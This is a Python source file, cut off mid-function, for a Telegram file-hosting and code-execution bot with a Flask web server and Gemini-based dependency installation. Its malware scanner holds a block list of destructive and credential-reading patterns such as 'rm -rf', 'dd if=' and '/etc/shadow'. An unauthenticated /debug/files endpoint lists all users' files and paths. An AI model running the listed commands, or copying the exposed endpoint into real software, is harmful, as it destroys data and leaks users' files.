# -*- coding: utf-8 -*-
"""
By @CyberHacked0
Universal File Hosting Bot - ENHANCED VERSION WITH GEMINI AI
Advanced file hosting with persistent data, auto-restart, comprehensive logging,
and AI-powered automatic dependency detection and installation
"""

import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
from telebot import types
import time
from datetime import datetime, timedelta
import psutil
import sqlite3
import json
import logging
import signal
import threading
import re
import sys
import atexit
import requests
import ast
from pathlib import Path
import hashlib
import base64

try:
    import google.generativeai as genai
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False
    print("Warning: Google Generative AI not installed. AI features will be disabled.")

# --- Flask Keep Alive ---
from flask import Flask, render_template, jsonify, request, send_file
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html>
    <head><title>Universal File Host</title></head>
    <body style="font-family: Arial; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px;">
        <h1>File Host By @CyberHacked0</h1>
        <h2>Multi-Language Code Execution & File Hosting Platform</h2>
        <p>📁 Supporting 30+ file types with secure hosting</p>
        <p>🚀 Multi-language code execution with auto-installation</p>
        <p>🛡️ Advanced security & anti-theft protection</p>
        <p>🌟 Real-time execution monitoring</p>
    </body>
    </html>
    """

@app.route('/file/<file_hash>')
def serve_file(file_hash):
    """Serve hosted files by hash"""
    try:
        # Find the file by hash
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                expected_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                if expected_hash == file_hash:
                    file_path = os.path.join(get_user_folder(user_id), file_name)
                    if os.path.exists(file_path):
                        return send_file(file_path, as_attachment=False)
                    else:
                        return f"File found in database but not on disk: {file_name}", 404

        return f"File not found for hash: {file_hash}", 404
    except Exception as e:
        logger.error(f"Error serving file {file_hash}: {e}")
        return f"Error serving file: {str(e)}", 500

@app.route('/debug/files')
def debug_files():
    """Debug endpoint to see all available files and their hashes"""
    try:
        files_info = []
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                file_path = os.path.join(get_user_folder(user_id), file_name)
                files_info.append({
                    'user_id': user_id,
                    'file_name': file_name,
                    'file_type': file_type,
                    'hash': file_hash,
                    'url': f"/file/{file_hash}",
                    'exists_on_disk': os.path.exists(file_path),
                    'path': file_path
                })

        html = "<html><body><h1>Available Files</h1><ul>"
        for info in files_info:
            html += f"<li>"
            html += f"<strong>{info['file_name']}</strong> (User: {info['user_id']})<br>"
            html += f"Type: {info['file_type']}<br>"
            html += f"Hash: {info['hash']}<br>"
            html += f"Exists: {info['exists_on_disk']}<br>"
            html += f"Path: {info['path']}<br>"
            html += f"<a href='{info['url']}'>Access File</a>"
            html += f"</li><hr>"
        html += "</ul></body></html>"

        return html
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/files')
def list_files():
    """List all hosted files (for debugging)"""
    try:
        files_list = []
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                if file_type == 'hosted':
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                    files_list.append({
                        'name': file_name,
                        'user_id': user_id,
                        'hash': file_hash,
                        'url': f"/file/{file_hash}"
                    })
        return jsonify({"files": files_list})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask Keep-Alive server started.")

# --- Configuration ---
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")

OWNER_ID = int(os.getenv('OWNER_ID', '7575315425'))
ADMIN_ID = int(os.getenv('ADMIN_ID', '7575315425'))
YOUR_USERNAME = os.getenv('BOT_USERNAME', '@Get_image_file_id_bot')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/crakacwa')
LOG_CHANNEL = os.getenv('LOG_CHANNEL', 'https://t.me/crakacwa')

GEMINI_API_KEY = os.getenv('GEMINI_API_KEY')
GEMINI_MODEL = "gemini-2.0-flash-exp"

try:
    if GEMINI_API_KEY:
        genai.configure(api_key=GEMINI_API_KEY)
        gemini_model = genai.GenerativeModel(GEMINI_MODEL)
        print(f"✅ Gemini AI initialized successfully!")
        print(f"🤖 Model: {GEMINI_MODEL}")
        print(f"🔑 API Key: {'*' * (len(GEMINI_API_KEY) - 8)}{GEMINI_API_KEY[-8:]}")
    else:
        print("⚠️ Gemini API Key missing")
        gemini_model = None
except Exception as e:
    print(f"⚠️ Gemini config error: {e}")
    gemini_model = None

# Enhanced folder setup
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_BOTS_DIR = os.path.join(BASE_DIR, 'upload_bots')
IROTECH_DIR = os.path.join(BASE_DIR, 'inf')
DATABASE_PATH = os.path.join(IROTECH_DIR, 'bot_data.db')
LOGS_DIR = os.path.join(BASE_DIR, 'execution_logs')
BACKUP_DIR = os.path.join(BASE_DIR, 'backups')
PERSISTENT_DATA_FILE = os.path.join(IROTECH_DIR, 'persistent_data.json')

# File upload limits
FREE_USER_LIMIT = 5
SUBSCRIBED_USER_LIMIT = 25
ADMIN_LIMIT = 999
OWNER_LIMIT = float('inf')

# Create necessary directories
for directory in [UPLOAD_BOTS_DIR, IROTECH_DIR, LOGS_DIR, BACKUP_DIR]:
    os.makedirs(directory, exist_ok=True)

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# --- Data structures ---
bot_scripts = {}
user_subscriptions = {}
user_files = {}
active_users = set()
admin_ids = {ADMIN_ID, OWNER_ID}
banned_users = set()
bot_locked = False
broadcast_mode = {}
clone_requests = {}
user_clones = {}

# --- Enhanced Persistent Data Management ---
def save_persistent_data():
    """Save all critical data to persistent JSON file"""
    try:
        persistent_data = {
            'active_users': list(active_users),
            'user_files': {str(k): v for k, v in user_files.items()},
            'user_subscriptions': {
                str(k): {
                    'expiry': v['expiry'].isoformat() if isinstance(v['expiry'], datetime) else v['expiry']
                } for k, v in user_subscriptions.items()
            },
            'admin_ids': list(admin_ids),
            'banned_users': list(banned_users),
            'bot_locked': bot_locked,
            'bot_scripts': {
                k: {
                    'user_id': v['user_id'],
                    'file_name': v['file_name'],
                    'start_time': v['start_time'].isoformat(),
                    'language': v.get('language', 'Unknown'),
                    'icon': v.get('icon', '📄')
                } for k, v in bot_scripts.items()
            },
            'user_clones': {
                str(k): {
                    'bot_username': v['bot_username'],
                    'clone_dir': v['clone_dir'],
                    'start_time': v['start_time'].isoformat()
                } for k, v in user_clones.items()
            },
            'last_backup': datetime.now().isoformat()
        }

        with open(PERSISTENT_DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(persistent_data, f, indent=2, ensure_ascii=False)

        logger.info("Persistent data saved successfully")
        return True
    except Exception as e:
        logger.error(f"Error saving persistent data: {e}")
        return False

def load_persistent_data():
    """Load all critical data from persistent JSON file"""
    global active_users, user_files, user_subscriptions, admin_ids, banned_users, bot_locked, bot_scripts, user_clones

    if not os.path.exists(PERSISTENT_DATA_FILE):
        logger.info("No persistent data file found, starting fresh")
        return False

    try:
        with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
            persistent_data = json.load(f)

        # Load basic data
        active_users = set(persistent_data.get('active_users', []))
        admin_ids = set(persistent_data.get('admin_ids', [ADMIN_ID, OWNER_ID]))
        banned_users = set(persistent_data.get('banned_users', []))
        bot_locked = persistent_data.get('bot_locked', False)

        # Load user files
        user_files = {}
        for user_id_str, files in persistent_data.get('user_files', {}).items():
            user_files[int(user_id_str)] = files

        # Load user subscriptions
        user_subscriptions = {}
        for user_id_str, sub_data in persistent_data.get('user_subscriptions', {}).items():
            try:
                user_subscriptions[int(user_id_str)] = {
                    'expiry': datetime.fromisoformat(sub_data['expiry'])
                }
            except (ValueError, KeyError):
                continue

        # Load bot scripts info for auto-restart
        bot_scripts_data = persistent_data.get('bot_scripts', {})
        logger.info(f"Found {len(bot_scripts_data)} scripts to auto-restart")

        # Load user clones info for auto-restart
        user_clones_data = persistent_data.get('user_clones', {})
        logger.info(f"Found {len(user_clones_data)} clones to auto-restart")

        logger.info("Persistent data loaded successfully")
        return True
    except Exception as e:
        logger.error(f"Error loading persistent data: {e}")
        return False

def auto_restart_scripts_and_clones():
    """Auto-restart all scripts and clones from persistent data"""
    try:
        # Load scripts info
        if os.path.exists(PERSISTENT_DATA_FILE):
            with open(PERSISTENT_DATA_FILE, 'r', encoding='utf-8') as f:
                persistent_data = json.load(f)

            # Auto-restart scripts
            bot_scripts_data = persistent_data.get('bot_scripts', {})
            for script_key, script_info in bot_scripts_data.items():
                user_id = script_info['user_id']
                file_name = script_info['file_name']

                user_folder = get_user_folder(user_id)
                file_path = os.path.join(user_folder, file_name)

                if os.path.exists(file_path):
                    logger.info(f"Auto-restarting script: {file_name} for user {user_id}")
                    success, result = execute_script(user_id, file_path)
                    if success:
                        logger.info(f"Successfully auto-restarted: {file_name}")
                        # Send notification to user
                        try:
                            bot.send_message(user_id, f"🔄 Your script '{file_name}' has been automatically restarted after bot reboot!")
                        except:
                            pass
                    else:
                        logger.error(f"Failed to auto-restart {file_name}: {result}")

            # Auto-restart clone bots from database (more reliable)
            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id, bot_username, token FROM clone_bots')

                for user_id, bot_username, token in c.fetchall():
                    logger.info(f"Auto-restarting clone bot for user {user_id}: @{bot_username}")
                    clone_success = create_bot_clone(user_id, token, bot_username)
                    if clone_success:
                        logger.info(f"Successfully auto-restarted clone bot: @{bot_username}")
                    else:
                        logger.error(f"Failed to auto-restart clone bot: @{bot_username}")

                conn.close()
            except Exception as e:
                logger.error(f"Error auto-restarting clones from database: {e}")

    except Exception as e:
        logger.error(f"Error in auto-restart: {e}")

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, 'bot.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Command Button Layouts ---
# Regular users - limited buttons
COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["⚡ Bot Speed", "📊 Statistics"],
    ["📞 Contact Owner"]
]

# Admin/Owner - all buttons WITHOUT Contact Owner
ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["⚡ Bot Speed", "📊 Statistics"],
    ["💳 Subscriptions", "📢 Broadcast"],
    ["🔒 Lock Bot", "🟢 Running All Code"],
    ["👑 Admin Panel"]
]

# --- Database Functions ---
def init_db():
    """Initialize the database with enhanced tables"""
    logger.info(f"Initializing database at: {DATABASE_PATH}")
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Create tables
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_files
                     (user_id INTEGER, file_name TEXT, file_type TEXT, upload_time TEXT,
                      PRIMARY KEY (user_id, file_name))''')
        c.execute('''CREATE TABLE IF NOT EXISTS active_users
                     (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, join_date TEXT, last_seen TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS admins
                     (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS running_scripts
                     (user_id INTEGER, file_name TEXT, start_time TEXT, pid INTEGER,
                      PRIMARY KEY (user_id, file_name))''')
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users
                     (user_id INTEGER PRIMARY KEY, reason TEXT, ban_date TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS clone_bots
                     (user_id INTEGER, bot_username TEXT, token TEXT, create_time TEXT,
                      PRIMARY KEY (user_id, bot_username))''')

        # Ensure admins
        c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
        if ADMIN_ID != OWNER_ID:
            c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))

        conn.commit()
        conn.close()
        logger.info("Database initialized successfully.")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")

def load_data():
    """Load data from database into memory and sync with persistent data"""
    logger.info("Loading data from database...")

    # First load persistent data for immediate recovery
    load_persistent_data()

    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Load subscriptions
        c.execute('SELECT user_id, expiry FROM subscriptions')
        for user_id, expiry in c.fetchall():
            try:
                user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
            except ValueError:
                logger.warning(f"Invalid expiry date for user {user_id}")

        # Load user files - merge with persistent data
        c.execute('SELECT user_id, file_name, file_type FROM user_files')
        db_user_files = {}
        for user_id, file_name, file_type in c.fetchall():
            if user_id not in db_user_files:
                db_user_files[user_id] = []
            db_user_files[user_id].append((file_name, file_type))

        # Update user_files with database data (prioritize database)
        for user_id, files in db_user_files.items():
            user_files[user_id] = files

        # Load active users - merge with persistent data
        c.execute('SELECT user_id FROM active_users')
        db_active_users = set(user_id for (user_id,) in c.fetchall())
        active_users.update(db_active_users)  # Merge both sources

        # Load admins
        c.execute('SELECT user_id FROM admins')
        admin_ids.update(user_id for (user_id,) in c.fetchall())

        # Load banned users
        c.execute('SELECT user_id FROM banned_users')
        banned_users.update(user_id for (user_id,) in c.fetchall())

        conn.close()
        logger.info(f"Data loaded: {len(active_users)} users, {len(user_files)} file records, {len(banned_users)} banned users")

        # Now auto-restart everything
        auto_restart_scripts_and_clones()

    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_running_script(user_id, file_name, pid=None):
    """Save running script to database for auto-restart"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO running_scripts (user_id, file_name, start_time, pid) VALUES (?, ?, ?, ?)',
                 (user_id, file_name, datetime.now().isoformat(), pid))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving running script: {e}")

def remove_running_script(user_id, file_name):
    """Remove running script from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error removing running script: {e}")

def save_user_info(user_id, username, first_name, last_name):
    """Save user information to database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO active_users (user_id, username, first_name, last_name, join_date, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
                 (user_id, username, first_name, last_name, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        conn.close()

        # Also update persistent data
        active_users.add(user_id)
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error saving user info: {e}")

def update_user_last_seen(user_id):
    """Update user's last seen timestamp"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE active_users SET last_seen = ? WHERE user_id = ?',
                 (datetime.now().isoformat(), user_id))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error updating last seen: {e}")

def save_clone_info(user_id, bot_username, token):
    """Save clone bot information to database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO clone_bots (user_id, bot_username, token, create_time) VALUES (?, ?, ?, ?)',
                 (user_id, bot_username, token, datetime.now().isoformat()))
        conn.commit()
        conn.close()

        # Also update persistent data
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error saving clone info: {e}")

def remove_clone_info(user_id):
    """Remove clone bot information from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('DELETE FROM clone_bots WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()

        # Also update persistent data
        save_persistent_data()
    except Exception as e:
        logger.error(f"Error removing clone info: {e}")

# --- Helper Functions ---
def get_user_folder(user_id):
    """Get or create user's folder for storing files"""
    user_folder = os.path.join(UPLOAD_BOTS_DIR, str(user_id))
    os.makedirs(user_folder, exist_ok=True)
    return user_folder

def get_user_file_limit(user_id):
    """Get the file upload limit for a user"""
    if user_id == OWNER_ID: return OWNER_LIMIT
    if user_id in admin_ids: return ADMIN_LIMIT
    if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
        return SUBSCRIBED_USER_LIMIT
    return FREE_USER_LIMIT

def get_user_file_count(user_id):
    """Get the number of files uploaded by a user"""
    return len(user_files.get(user_id, []))

def is_bot_running(script_owner_id, file_name):
    """Check if a bot script is currently running"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('process'):
        try:
            proc = psutil.Process(script_info['process'].pid)
            is_running = proc.is_running() and proc.status() != psutil.STATUS_ZOMBIE
            if not is_running:
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            return is_running
        except psutil.NoSuchProcess:
            if script_key in bot_scripts:
                del bot_scripts[script_key]
            return False
        except Exception:
            return False
    return False

def get_script_uptime(script_owner_id, file_name):
    """Get the uptime of a running script"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('start_time'):
        uptime = datetime.now() - script_info['start_time']
        return str(uptime).split('.')[0]  # Remove microseconds
    return None

def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
    """Safely send message with fallback for parse errors"""
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Send without parse_mode if there's a parsing error
            return bot.send_message(chat_id, text, reply_markup=reply_markup)
        else:
            raise e

def safe_edit_message(chat_id, message_id, text, parse_mode=None, reply_markup=None):
    """Safely edit message with fallback for parse errors"""
    try:
        return bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Edit without parse_mode if there's a parsing error
            return bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup)
        else:
            raise e

def safe_reply_to(message, text, parse_mode=None, reply_markup=None):
    """Safely reply to message with fallback for parse errors"""
    try:
        return bot.reply_to(message, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Reply without parse_mode if there's a parsing error
            return bot.reply_to(message, text, reply_markup=reply_markup)
        else:
            raise e

def send_to_log_channel(message, document=None):
    """Send message to log channel with optional file"""
    try:
        if document:
            bot.send_document(LOG_CHANNEL, document, caption=message)
        else:
            bot.send_message(LOG_CHANNEL, message)
    except Exception as e:
        logger.error(f"Failed to send message to log channel: {e}")

def create_backup():
    """Create backup of important data"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = os.path.join(BACKUP_DIR, f"backup_{timestamp}.db")
        shutil.copy2(DATABASE_PATH, backup_file)

        # Keep only last 5 backups
        backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('backup_')])
        if len(backups) > 5:
            for old_backup in backups[:-5]:
                os.remove(os.path.join(BACKUP_DIR, old_backup))

        logger.info(f"Backup created: {backup_file}")
    except Exception as e:
        logger.error(f"Backup creation failed: {e}")

# --- Enhanced Security Checks ---
def check_malicious_code(file_path):
    """Advanced security check for system commands and malicious patterns including encoded scripts"""
    critical_patterns = [
        # System commands
        'sudo ', 'su ', 'rm -rf', 'fdisk', 'mkfs', 'dd if=', 
        'shutdown', 'reboot', 'halt', 'poweroff',

        # Command injection
        '/bin/', '/usr/', '/sbin/', '/etc/', '/var/', '/root/',
        '/ls', '/cd', '/pwd', '/cat', '/grep', '/find',
        '/del', '/get', '/getall', '/download', '/upload',
        '/steal', '/hack', '/dump', '/extract', '/copy',

        # File operations
        'bot.send_document', 'send_document', 'bot.get_file',
        'download_file', 'send_media_group', 'os.remove("/"',
        'shutil.rmtree("/"', 'os.unlink("/"',

        # System execution
        'os.system("rm', 'os.system("sudo', 'os.system("format',
        'subprocess.call(["rm"', 'subprocess.call(["sudo"',
        'subprocess.run(["rm"', 'subprocess.run(["sudo"',
        'os.system("/bin/', 'os.system("/usr/', 'os.system("/sbin/',

        # Network operations
        'requests.post.*files=', 'urllib.request.urlopen.*data=',

        # Process operations
        'os.kill(', 'signal.SIGKILL', 'psutil.process_iter',

        # Environment manipulation
        'os.environ["PATH"]', 'os.putenv("PATH"',

        # Privilege escalation
        'setuid', 'setgid', 'chmod 777', 'chown root',

        # Format commands
        'os.system("format', 'subprocess.call(["format"', 'subprocess.run(["format"',

        # Encoded/obfuscated code patterns
        'base64.b64decode', 'base64.b64encode', 'base64.decode',
        'exec(', 'eval(', 'compile(', '__import__',
        'getattr', 'setattr', 'hasattr',
        'marshal.loads', 'pickle.loads', 'zlib.decompress',

        # Obfuscation patterns
        'chr(', 'ord(', 'decode(', 'encode(',
        'rot13', 'xor', 'obfuscate',

        # Suspicious imports
        'import os.system', 'import subprocess.call',
        'from os import system', 'from subprocess import call',

        # File path traversal
        '../', '..\\', '/etc/passwd', '/etc/shadow',
        'C:\\Windows\\System32', '/bin/bash', '/bin/sh'
    ]

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            content_lower = content.lower()

        # Check for critical security violations
        for pattern in critical_patterns:
            if pattern.lower() in content_lower:
                return False, f"SECURITY THREAT: {pattern} detected - File upload blocked!\n\nIf you believe this is a legitimate file, contact @CyberHacked0 for verification."

        # Check for encoded base64 strings (long base64 strings)
        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        base64_matches = re.findall(base64_pattern, content)
        for b64_match in base64_matches:
            try:
                # Try to decode to check if it's valid base64
                decoded = base64.b64decode(b64_match)
                # If it decodes successfully and is long, it might be encoded payload
                if len(decoded) > 50:
                    return False, "ENCODED PAYLOAD DETECTED: Base64 encoded content found - File upload blocked!\n\nIf this is legitimate, contact @CyberHacked0."
            except:
                pass

        # Check for suspicious file theft combinations
        theft_combos = [
            ['os.listdir', 'send_document'],
            ['os.walk', 'bot.send'],
            ['glob.glob', 'upload'],
            ['open(', 'send_document'],
            ['read()', 'bot.send'],
            ['file.read', 'requests.post'],
            ['open(', 'base64.b64decode']
        ]

        for combo in theft_combos:
            if all(item.lower() in content_lower for item in combo):
                return False, f"File theft pattern detected: {' + '.join(combo)}\n\nIf this is a legitimate use case, contact @CyberHacked0."

        # Check for eval/exec with dynamic content
        eval_patterns = [
            r'eval\s*\(\s*[\w\.]+',
            r'exec\s*\(\s*[\w\.]+',
            r'compile\s*\(\s*[\w\.]+',
            r'__import__\s*\(\s*[\w\.]+'
        ]

        for pattern in eval_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return False, f"DYNAMIC CODE EXECUTION DETECTED: {pattern} - File upload blocked!\n\nContact @CyberHacked0 for verification."

        # Check file size limit
        file_size = os.path.getsize(file_path)
        if file_size > 5 * 1024 * 1024:
            return False, "File too large - exceeds 5MB limit"

        return True, "Code appears safe"
    except Exception as e:
        return False, f"Error scanning file: {e}"

def analyze_code_with_gemini(file_path, file_ext):
    """Use Gemini AI to analyze code and detect requirements"""
    if not GEMINI_API_KEY or not gemini_model:
        logger.warning("Gemini AI not available - skipping analysis")
        return None

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            code_content = f.read()

        language_map = {
            '.py': 'Python', '.php': 'PHP', '.js': 'JavaScript', 
            '.ts': 'TypeScript', '.java': 'Java', '.go': 'Go',
            '.rs': 'Rust', '.cpp': 'C++', '.c': 'C', '.rb': 'Ruby'
        }
        language = language_map.get(file_ext, 'Unknown')

        model = genai.GenerativeModel(GEMINI_MODEL)

        prompt = f"""Analyze this {language} code deeply and provide comprehensive information:

1. Detect ALL required dependencies/packages (including system packages)
2. Identify if it's a Telegram bot (webhook/polling)
3. Find any API keys, tokens, or credentials that user needs to provide
4. Detect database requirements (MySQL, PostgreSQL, MongoDB, etc.)
5. Find environment variables needed
6. Check for any configuration files needed

Code:
```{language.lower()}
{code_content[:4000]}
```

Respond in JSON format:
{{
    "language": "Python|PHP|JavaScript|etc",
    "dependencies": ["package1", "package2"],
    "system_packages": ["curl", "git"],
    "is_telegram_bot": true|false,
    "bot_mode": "webhook"|"polling"|"unknown",
    "needs_conversion": true|false,
    "user_inputs_required": {{
        "api_keys": ["TELEGRAM_BOT_TOKEN", "OPENAI_API_KEY"],
        "database_credentials": ["DB_HOST", "DB_USER", "DB_PASSWORD"],
        "other_config": ["ADMIN_ID", "CHANNEL_ID"]
    }},
    "install_commands": {{"python": ["pip install package1", "pip install package2"], "php": ["composer require package1"]}},
    "additional_setup": ["Create .env file", "Run database migrations"],
    "missing_files": ["config.php", ".env"]
}}"""

        response = model.generate_content(prompt)
        result_text = response.text.strip()

        if result_text.startswith('```json'):
            result_text = result_text[7:]
        if result_text.endswith('```'):
            result_text = result_text[:-3]
        result_text = result_text.strip()

        analysis = json.loads(result_text)
        return analysis

    except Exception as e:
        error_msg = str(e)
        if "429" in error_msg or "quota" in error_msg.lower():
            logger.warning(f"Gemini API quota exceeded - continuing without AI analysis")
        else:
            logger.error(f"Gemini AI analysis failed: {e}")
        return None

def convert_webhook_to_polling(file_path, file_ext):
    """Convert webhook-based Telegram bot to polling mode"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()

        if file_ext == '.py':
            webhook_patterns = [
                (r'bot\.set_webhook\([^)]+\)', ''),
                (r'bot\.remove_webhook\([^)]*\)', ''),
                (r'@app\.route\([^)]*\)[\s\S]*?def\s+\w+\([^)]*\):[^\n]*\n[\s\S]*?bot\.process_new_updates',
                 'bot.infinity_polling()'),
                (r'app\.run\([^)]*\)', 'bot.infinity_polling()')
            ]

            for pattern, replacement in webhook_patterns:
                content = re.sub(pattern, replacement, content)

            if 'bot.infinity_polling()' not in content and 'bot.polling()' not in content:
                if 'if __name__' in content:
                    content = re.sub(
                        r'if\s+__name__\s*==\s*["\']__main__["\']\s*:',
                        'if __name__ == "__main__":\n    bot.infinity_polling()',
                        content,
                        count=1
                    )
                else:
                    content += '\n\nif __name__ == "__main__":\n    bot.infinity_polling()\n'

        elif file_ext == '.php':
            webhook_patterns = [
                (r'setWebhook\([^)]+\)', ''),
                (r'deleteWebhook\([^)]*\)', '')
            ]

            for pattern, replacement in webhook_patterns:
                content = re.sub(pattern, replacement, content)

            if 'getUpdates' not in content:
                content += '\n\n// Polling mode\nwhile(true) {\n    $bot->getUpdates();\n    sleep(1);\n}\n'

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)

        return True, "Successfully converted webhook to polling mode"

    except Exception as e:
        logger.error(f"Webhook to polling conversion failed: {e}")
        return False, f"Conversion failed: {str(e)}"

def auto_install_dependencies(file_path, file_ext, user_folder, user_id=None, message=None):
    """Auto-install dependencies using Gemini AI analysis"""
    installations = []

    ai_analysis = analyze_code_with_gemini(file_path, file_ext)

    if ai_analysis:
        logger.info(f"🤖 AI Analysis: {ai_analysis}")

        # Check for user inputs required
        user_inputs = ai_analysis.get('user_inputs_required', {})
        if user_inputs:
            missing_inputs = []

            # Check API keys
            api_keys = user_inputs.get('api_keys', [])
            if api_keys:
                missing_inputs.extend(api_keys)

            # Check database credentials
            db_creds = user_inputs.get('database_credentials', [])
            if db_creds:
                missing_inputs.extend(db_creds)

            # Check other config
            other_config = user_inputs.get('other_config', [])
            if other_config:
                missing_inputs.extend(other_config)

            # Notify user about missing inputs
            if missing_inputs and user_id and message:
                user_notification = f"🤖 AI ने आपके code को analyze किया!\n\n"
                user_notification += f"⚠️ Bot को run करने के लिए निम्नलिखित जानकारी चाहिए:\n\n"

                for idx, input_item in enumerate(missing_inputs, 1):
                    user_notification += f"{idx}. {input_item}\n"

                user_notification += f"\n💡 कृपया ये values provide करें ताकि AI automatically setup कर सके।\n"
                user_notification += f"📝 Format: /setconfig {missing_inputs[0]} YOUR_VALUE"

                try:
                    bot.send_message(user_id, user_notification)
                    installations.append(f"📨 User notified about required inputs")
                except:
                    pass

        # Convert webhook to polling if needed
        if ai_analysis.get('is_telegram_bot') and ai_analysis.get('needs_conversion'):
            success, msg = convert_webhook_to_polling(file_path, file_ext)
            if success:
                installations.append(f"✅ {msg}")
            else:
                installations.append(f"⚠️ {msg}")

        # Install dependencies
        dependencies = ai_analysis.get('dependencies', [])

        if file_ext == '.py' and dependencies:
            installations.append(f"🐍 Installing Python packages...")
            for package in dependencies:
                try:
                    result = subprocess.run(
                        [sys.executable, '-m', 'pip', 'install', package], 
                        capture_output=True, text=True, timeout=60
                    )
                    if result.returncode == 0:
                        installations.append(f"✅ Installed: {package}")
                    else:
                        installations.append(f"⚠️ Failed: {package}")
                except Exception as e:
                    installations.append(f"❌ Error: {package} - {str(e)}")

        elif file_ext == '.php' and dependencies:
            installations.append(f"🐘 Installing PHP packages...")
            composer_json_path = os.path.join(user_folder, 'composer.json')
            if not os.path.exists(composer_json_path):
                composer_data = {
                    "name": "user/bot",
                    "description": "Auto-generated composer.json",
